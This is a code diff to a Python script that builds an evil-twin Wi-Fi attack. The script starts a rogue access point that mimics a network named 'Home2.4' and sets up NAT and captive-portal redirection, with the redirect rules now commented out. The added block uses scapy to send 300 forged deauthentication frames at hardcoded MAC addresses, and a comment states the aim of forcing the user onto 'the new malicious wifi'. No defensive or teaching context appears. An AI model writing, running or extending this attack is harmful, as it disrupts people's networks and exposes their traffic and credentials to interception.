@@ -1,3 +1,4 @@
+from scapy.all import *
 import os
 import subprocess
 import time
@@ -41,10 +42,10 @@ def start_ap(iface_wifi, iface_router, gateway_ip, portal_address):
     subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True, text=True)
     subprocess.call(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING', '-o', iface_router, '-j', 'MASQUERADE'])
 
-    # Redirect clients to the captive portal page
-    subprocess.call(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface_wifi, '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', portal_address])
-
-    subprocess.call(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface_wifi, '-p', 'tcp', '--dport', '443', '-j', 'DNAT', '--to-destination', portal_address])
+    # # Redirect clients to the captive portal page
+    # subprocess.call(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface_wifi, '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', portal_address])
+    #
+    # subprocess.call(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface_wifi, '-p', 'tcp', '--dport', '443', '-j', 'DNAT', '--to-destination', portal_address])
 
     # subprocess.call(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '443', '-j', 'DNAT',
     #                  '--to-destination', portal_address])
@@ -83,6 +84,8 @@ if len(sys.argv) > 2:
 
 ssid += "8"
 
+ssid = "Home2.4"
+
 gateway_ip = "192.168.1.1"  # IP address of the router
 iface_router = "wlp0s20f3"
 portal_address = "10.100.102.122:5000"
@@ -90,3 +93,14 @@ portal_address = "10.100.102.122:5000"
 set_adapter_to_monitor(interface)
 start_ap(interface, iface_router, gateway_ip, portal_address)
 create_ap_config(ssid, interface, wifi_channel)
+
+time.sleep(10)
+channel = 7
+set_adapter_to_monitor(interface)
+# os.system("iwconfig %s channel %d" % (interface, channel))
+deauth = RadioTap() / Dot11(addr1="28:cd:c4:9b:87:f5", addr2="34:49:5b:17:a9:b4", addr3="34:49:5b:17:a9:b4") / Dot11Deauth()
+# Send the frame
+
+# loop until the user enters to the new malicious wifi
+
+sendp(deauth, iface=interface, count=300)
